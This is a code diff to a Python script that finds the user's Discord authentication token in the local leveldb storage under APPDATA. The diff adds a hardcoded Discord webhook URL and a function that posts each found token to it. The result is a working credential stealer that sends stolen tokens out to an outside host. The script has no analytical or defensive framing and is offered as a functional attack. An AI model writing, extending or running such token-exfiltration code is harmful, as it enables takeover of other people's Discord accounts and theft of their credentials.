@@ -1,14 +1,34 @@
 import os
 import re
+import requests
 
-discord_data_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')
-token_pattern = re.compile(r'"token"\s*:\s*"([^"]+)"')
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1255196642349416599/XhdAI4R7KifKEie66INdXq-E1L8jtAmO4hnn6Zkxjk5P9dZfJ-cotxTrKbEea8l87jGr'
 
-for filename in os.listdir(discord_data_path):
-    if filename.endswith('.log') or filename.endswith('.ldb'):
-        with open(os.path.join(discord_data_path, filename), 'r', errors='ignore') as file:
-            content = file.read()
-            match = token_pattern.search(content)
-            if match:
-                print(f'Token found: {match.group(1)}')
-                break
+def send_message(message):
+    data = {
+        'content': message
+    }
+    response = requests.post(WEBHOOK_URL, json=data)
+
+    if response.status_code == 204:
+        print('Message sent successfully!')
+    else:
+        print(f'Failed to send message. Status code: {response.status_code}')
+
+def find_and_send_tokens():
+    discord_data_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')
+    token_pattern = re.compile(r'"token"\s*:\s*"([^"]+)"')
+
+    for filename in os.listdir(discord_data_path):
+        if filename.endswith('.log') or filename.endswith('.ldb'):
+            with open(os.path.join(discord_data_path, filename), 'r', errors='ignore') as file:
+                content = file.read()
+                match = token_pattern.search(content)
+                if match:
+                    token = match.group(1)
+                    print(f'Token found: {token}')
+                    send_message(f'Discord token found: {token}')
+                    break
+
+if __name__ == '__main__':
+    find_and_send_tokens()
